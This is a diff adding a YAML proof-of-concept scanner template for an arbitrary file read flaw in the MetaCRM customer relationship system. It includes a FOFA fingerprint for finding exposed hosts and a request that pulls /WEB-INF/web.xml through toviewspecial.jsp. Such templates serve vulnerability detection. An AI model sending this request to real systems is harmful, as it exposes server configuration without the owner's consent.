@@ -1,0 +1,18 @@
+id: poc-yaml-metacrm-toviewspecial-jsp-anyfile-read
+info:
+  name: MetaCRM客户关系管理系统 toviewspecial.jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js"
+requests:
+- method: GET
+  path: /indexbusiness.jsp
+  expression: status_code == 200 && contains(body,"MetaCRM")
+- method: GET
+  path: /business/common/toviewspecial.jsp?view=/WEB-INF/web.xml
+  expression: "status_code == 200 && \ncontains(body,\"</meta>\") &&\ncontains(body,\"\
+    </web-app>\") &&\ncontains(body,\"<servlet-name>\")\n"
+variables: {}
+transport: http
